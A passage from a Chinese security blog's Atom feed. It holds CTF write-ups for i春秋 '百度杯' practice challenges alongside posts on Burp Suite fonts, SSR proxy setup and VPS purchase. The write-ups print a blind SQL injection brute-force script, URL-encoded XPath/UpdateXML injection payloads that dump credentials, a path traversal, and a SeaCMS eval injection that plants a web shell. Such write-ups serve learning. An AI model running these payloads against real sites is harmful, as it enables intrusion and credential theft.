string.ascii_letters + string.digits<br>temp = ‘’<br>for i in range(40):<br>    print(“the”+str(i)+”one”)<br>    for p in payloads:<br>        payload = temp + p<br>        name = “admin’ or user_n3me like ‘{}%’ ;#”.format(payload)<br>        data = dict(username=name, passwrod=’test’)<br>        res = requests.post(url, headers=headers, data=data)<br>        if (len(res.content) == 12):<br>            temp = temp + p<br>            print(temp.ljust(32, ‘.’))<br>            break<br><code>`</code><br>换url和列名就行。</p><p>登陆进去之后是这个页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/83153689.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>那个.bctfg1t看起来像个.git文件，试了一下：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/205237.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>果然是个.git文件，githack跑完之后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/25792402.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>接下来很明显就是还原版本了，<br><code>git cat-file -p 哈希</code><br>一直到a1开头的哈希：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/74666070.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>出来一个文件名,我们访问他：<br>得到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/79811599.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开页面是一个登陆框:&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/31511072.jpg&quot; al
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term=".git泄露" scheme="http://yoursite.com/tags/git%E6%B3%84%E9%9C%B2/"/>
    
      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>解决burpsuite里中文不显示的方法</title>
    <link href="http://yoursite.com/2018/05/31/bp/"/>
    <id>http://yoursite.com/2018/05/31/bp/</id>
    <published>2018-05-31T09:12:12.000Z</published>
    <updated>2018-05-31T09:15:12.434Z</updated>
    
    <content type="html"><![CDATA[<p>burpsuite中文显示不出，某些时候非常不好用</p><p>这里用的版本是1.7.26，其他的版本修改方式没有大的区别</p><p>打开burpsuite，找到<code>user options</code>:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/43899203.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>然后在display中的http message display选择成中文字体，<br>这里选择微软雅黑：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/64155627.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>然后就成功了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;burpsuite中文显示不出，某些时候非常不好用&lt;/p&gt;
&lt;p&gt;这里用的版本是1.7.26，其他的版本修改方式没有大的区别&lt;/p&gt;
&lt;p&gt;打开burpsuite，找到&lt;code&gt;user options&lt;/code&gt;:&lt;br&gt;&lt;figure class=&quot;image-bo
      
    
    </summary>
    
      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="burpsuite" scheme="http://yoursite.com/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>i春秋 &quot;百度杯&quot; 九月场 123 writeup</title>
    <link href="http://yoursite.com/2018/05/28/123/"/>
    <id>http://yoursite.com/2018/05/28/123/</id>
    <published>2018-05-28T04:09:58.000Z</published>
    <updated>2018-05-30T11:47:43.241Z</updated>
    
    <content type="html"><![CDATA[<p>打开是个登陆界面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/25548456.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>查看一下源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/89077544.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>用户信息都在<code>user.php</code>里，<br>密码的结构也告诉你了，猜想是爆破<br>但是现在没有字典，<br>我们先访问一下<code>user.php</code>，发现啥都没有，<br>一开始以为是文件包含，但是没有变量可以用<br>可能是备份文件获取，试试<code>user.php.bak</code><br>果然：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/71911141.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>将文件下载下来之后发现是用户名的信息，<br>打开burpsuite开始爆破：<br>从1990年开始（大佬们wp写的，我也不知道为什么）<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/70641293.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>字典直接用刚刚的user.php<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/50813700.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>开始爆破：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/2436984.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>得到了一个用户<code>lixiuyun</code> 密码 <code>lixiuyun1990</code></p><p>登陆进去之后也是什么都没有，查看源代码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/84033226.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>本地构建html：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/68268069.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>php别名：php2, php3, php4, php5, phps, pht, phtm, phtml …<br>都可以试试:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/2201720.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>可以看到有个view.php了，打开看看<br>这次估计真是文件包含了：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/3508568.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这里还有个过滤，将flag过滤了<br>双写flag即可拿到flag：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/23475809.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开是个登陆界面：&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/25548456.jpg&quot; alt=
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="爆破" scheme="http://yoursite.com/tags/%E7%88%86%E7%A0%B4/"/>
    
      <category term="备份文件获取" scheme="http://yoursite.com/tags/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96/"/>
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>i春秋 &quot;百度杯&quot; 九月场 Yeser writeup</title>
    <link href="http://yoursite.com/2018/05/28/YeserCMS/"/>
    <id>http://yoursite.com/2018/05/28/YeserCMS/</id>
    <published>2018-05-28T01:27:26.000Z</published>
    <updated>2018-05-30T11:55:22.336Z</updated>
    
    <content type="html"><![CDATA[<p>打开来是一个不知道什么cms的页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/45802196.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>上cms指纹识别：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/67711801.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>但是貌似识别不出来，想想其他方法<br>比如搜一搜传递的变量名，也就是URL后面跟着的一大堆东西<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47690650.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>点进去看了看，跟题目的cms差不多<br>差不多确定是easycms了，搜一搜easycms漏洞<br>但是找到的大多数不能用，<br>最终还是看了大佬们写的writeup<br>在<code>URL/celive/live/header.php</code><br>处有一个xpath注入漏洞<a href="http://www.91ri.org/7147.html" target="_blank" rel="noopener">xpath注入科普</a><br>payload：<br>第一段：</p><p><code>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><br><q>detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C1%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520</q></xjxquery><br></code></p><p>第二段：</p><p><code>xajax=Postdata&amp;xajaxargs[0]=<xjxquery><br><q>detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520</q></xjxquery><br></code><br>这里得分成两段显示：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/51587652.jpg" alt="" title="" class="">                <p></p>            </figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/60060206.jpg" alt="" title="" class="">                <p></p>            </figure><p>得到管理员的账户是<code>admin</code><br>密码是md5加密的<code>Yeser231</code><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/22571721.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>登陆后台：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/1821806.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>找地方上传shell，自己找了很久没有找到地方，最后还是看的大佬的wp<br>在模版-&gt;当前模版编辑处<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/62323393.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>点击编辑，这个时候会把这个文件名传进去，<br>然后再显示出来这个文件的内容：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/78331668.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这个时候直接看到提示：<code>flag在网站根目录下的flag.php中</code><br>把id换成<br><code>../../flag.php</code><br>即可得到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/47210201.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开来是一个不知道什么cms的页面：&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/45802196.
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="xpath注入" scheme="http://yoursite.com/tags/xpath%E6%B3%A8%E5%85%A5/"/>
    
      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>i春秋 &quot;百度杯&quot; 九月场 Test writeup</title>
    <link href="http://yoursite.com/2018/05/28/test/"/>
    <id>http://yoursite.com/2018/05/28/test/</id>
    <published>2018-05-28T01:27:13.000Z</published>
    <updated>2018-05-30T11:54:23.066Z</updated>
    
    <content type="html"><![CDATA[<p>首先打开题目：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/34916792.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>发现是一个海洋CMS，但是不太清楚版本<br>往下翻一翻，发现有个年份<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/41559037.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>看得出是一个很老的版本了，题目的提示是：<br><code>善于查资料，你就可以拿一血了</code><br>好吧直接查资料：<br><code>海洋cms漏洞利用</code><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/41559037.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>直接一大块的漏洞出来了。<br>这里直接找到payload了：<br><code>/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd])</code></p><p>然后打开菜刀：<br>密码<code>cmd</code>连接即可：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/90521376.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>连接成功：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/9609352.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>可以发现在html/data下有个common.inc.php<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/36892120.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这个是数据库的配置文件</p><p>菜刀连接数据库拿到flag:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/6211372.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先打开题目：&lt;br&gt;&lt;figure class=&quot;image-box&quot;&gt;
                &lt;img src=&quot;http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-28/34916792.jpg&quot; alt=&quot;&quot;
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="sql注入" scheme="http://yoursite.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Centos6&amp;7 搭建ssr科学上网及IPv6免流</title>
    <link href="http://yoursite.com/2018/05/27/ssr/"/>
    <id>http://yoursite.com/2018/05/27/ssr/</id>
    <published>2018-05-27T01:31:22.000Z</published>
    <updated>2018-06-17T08:08:24.556Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-购买vps"><a href="#1-购买vps" class="headerlink" title="1.购买vps"></a>1.购买vps</h3><p>这里给出<a href="https://cherrygk.github.io/2018/05/27/vps/" target="_blank" rel="noopener">链接</a>，就不仔细介绍了</p><h3 id="2-搭建ssr"><a href="#2-搭建ssr" class="headerlink" title="2.搭建ssr"></a>2.搭建ssr</h3><p>连接上xshell或者其他shell软件之后，复制以下命令：<br><code>wget -N <a href="https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh</a><br>chmod +x ssr.sh<br>bash ssr.sh<br></code><br>一条一条命令执行即可，执行完之后看到的是这个页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/30188874.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>选择1安装ssr，将端口号设置成443，密码写个自己能记住的密码：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/35840001.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>加密方式选择<code>10. aes-256-cfb</code><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/38496608.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>协议插件和混淆插件分别选择：<br><code>2.auth_sha1_v4和tls1.2_ticket_auth</code></p><p>询问<code>是否兼容原版</code>，原版就是ss，这里选择no，<br>选择yes的话就能支持ss客户端了：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/55693970.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>限制的设备数、单线程限速上限、每个端口的总速度，这里都直接回车，选择默认（不限速）：<br>(这里自用，所以没有限速和限流)<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/42615922.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>回车之后就可以开始安装了：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/52424243.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>出来这个页面的话，证明已经安装完成了，<br>如果嫌麻烦的话，这样已经可以直接用了，<br>但是如果你想<code>多端口配置</code>也是可以的,<br>输入:<br><code>bash ssr.sh</code><br>进入ssr的管理页面,<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/73282461.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>如果之前的步骤有些小问题的话这里也是可以修改的，<br>现在我们需要切换成<code>多端口模式</code>：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/42295513.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>配置跟之前的单端口一样就行，设置成功后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/41616348.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>直接就有一个端口，这个端口是之前单端口设置的，<br>进入管理页面：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/34687472.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>多端口模式下<code>7.用户配置</code>可以添加新的端口：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/43110869.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>操作跟之前一样，配置成功后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/21970127.jpg" alt="" title="" class="">                <p></p>            </figure></p><h3 id="3-客户端的安装"><a href="#3-客户端的安装" class="headerlink" title="3.客户端的安装"></a>3.客户端的安装</h3><h4 id="SSR"><a href="#SSR" class="headerlink" title="SSR:"></a>SSR:</h4><p>Windows：<br><code><a href="https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z" target="_blank" rel="noopener">https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z</a></code><br>安卓：<br><code><a href="https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk" target="_blank" rel="noopener">https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk</a></code></p><p>windows版解压完之后直接运行：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/31371154.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>任务栏会出现一个小飞机：<br>首先我们把前面ssr的链接复制下来，然后右键小飞机，选择剪贴板导入即可。</p><p>安卓的比较简单，就不仔细截图了。<br>首先将APK安装-&gt;然后点击顶上方的“▼”-&gt;选择右下方的“+”<br>-&gt;从剪切板导入即可(同样得复制之前的ssr链接)</p><h4 id="SS"><a href="#SS" class="headerlink" title="SS"></a>SS</h4><p>Windows：<br><code><a href="https://github.com/shadowsocks/shadowsocks-windows/releases" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-windows/releases</a></code><br>安卓：<br><code><a href="https://github.com/shadowsocks/shadowsocks-android/releases" target="_blank" rel="noopener">https://github.com/shadowsocks/shadowsocks-android/releases</a></code></p><p>使用方法跟ssr差不多，对照着就行。</p><h3 id="4-bbr加速"><a href="#4-bbr加速" class="headerlink" title="4.bbr加速"></a>4.bbr加速</h3><p>这一步主要是给自己的ssr提速<br>复制以下命令到shell里:</p><pre>yum -y install wgetwget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh</pre><p>安装完之后会提示你是否重启，选择y<br>然后就能正常使用了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-购买vps&quot;&gt;&lt;a href=&quot;#1-购买vps&quot; class=&quot;headerlink&quot; title=&quot;1.购买vps&quot;&gt;&lt;/a&gt;1.购买vps&lt;/h3&gt;&lt;p&gt;这里给出&lt;a href=&quot;https://cherrygk.github.io/2018/05/27
      
    
    </summary>
    
      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="免流" scheme="http://yoursite.com/tags/%E5%85%8D%E6%B5%81/"/>
    
      <category term="科学上网" scheme="http://yoursite.com/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>VPS的选择及购买</title>
    <link href="http://yoursite.com/2018/05/27/vps/"/>
    <id>http://yoursite.com/2018/05/27/vps/</id>
    <published>2018-05-27T01:27:02.000Z</published>
    <updated>2018-05-30T11:54:01.058Z</updated>
    
    <content type="html"><![CDATA[<p>这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷）</p><h3 id="注册Vultr"><a href="#注册Vultr" class="headerlink" title="注册Vultr"></a>注册Vultr</h3><p>打开<a href="https://www.vultr.com/?ref=7382462" target="_blank" rel="noopener">注册链接</a><br>点击右上方的Create Account<br>注册比较简单，输入邮箱密码创建就行<br>进入邮箱确认，登陆后：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/87688976.jpg" alt="" title="" class="">                <p></p>            </figure></p><h3 id="充值"><a href="#充值" class="headerlink" title="充值"></a>充值</h3><p>点击<code>Billing</code>,然后点击<code>Make Payment</code>下的<code>Alipay</code><br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/73845292.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>选择价格然后充值，第一次使用少充点，10美元就行<br>觉得好用再继续充值就行，<br>然后会跳转到支付宝的支付页面，用支付宝付款即可</p><h3 id="添加服务器"><a href="#添加服务器" class="headerlink" title="添加服务器"></a>添加服务器</h3><p>点击左侧的Servers<br>可以看到右边有个“+”号：<br>点击之后，这个页面是选择地区<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/9681133.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>在国内的话最好选择日本的服务器<br>速度最快<br>可以选择其他地区的比如纽约，洛杉矶，速度也不慢<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/35259126.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>选择系统类型，这里选择centos6，<br>因为centos7的防火墙可能会导致ssr的一些服务不能用<br>价格选择，当然是越贵越好了，但是这个好只是体现在连接的人数<br>个人用的话选择最便宜的就行了。<br>下方勾选Enable IPv6，需要IPv6免流的可以勾上<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/71161788.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>然后直接Deploy Now即可</p><p>这里附上一种测速方法：</p><pre>使用ping命令：vutrl一开始最多可以创建5个VPS创建完之后拿ping命令去试试速度win+r 输入cmd在控制台输入：ping 你的服务器IP看看延迟就行，延迟越低速度越快如果速度很慢的话把这个服务器删掉就行（创建5分钟之内不能消除）</pre><h3 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h3><p>回到Servers页面<br>点击刚刚创建的服务器<br>这里的IP和密码待会得用到<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/768601.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>这里有服务器的ssh<br>我们需要使用shell软件来连接他<br>这里演示的是xshell：<br>从网上直接下载xshell就可以使用：<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/45907955.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>点击文件，新建<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/44226464.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>名称随便写个就行，主机处填写你服务器的IP<br>然后点击左边的用户身份验证<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/14476746.jpg" alt="" title="" class="">                <p></p>            </figure></p><p>用户名写root，密码从刚刚那个页面复制下来，<br>然后点击连接就行<br>出现这个页面就代表连接成功了:<br><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-27/88630009.jpg" alt="" title="" class="">                <p></p>            </figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷）&lt;/p&gt;
&lt;h3 id=&quot;注册Vultr&quot;&gt;&lt;a href=&quot;#注册Vultr&quot; class=&quot;headerlink&quot; title=&quot;注册Vultr&quot;&gt;&lt;/a&gt;注册Vultr&lt;/h3&gt;&lt;p&gt;打开&lt;a
      
    
    </summary>
    
      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="vps购买" scheme="http://yoursite.com/tags/vps%E8%B4%AD%E4%B9%B0/"/>
    
  </entry>
  
</feed>
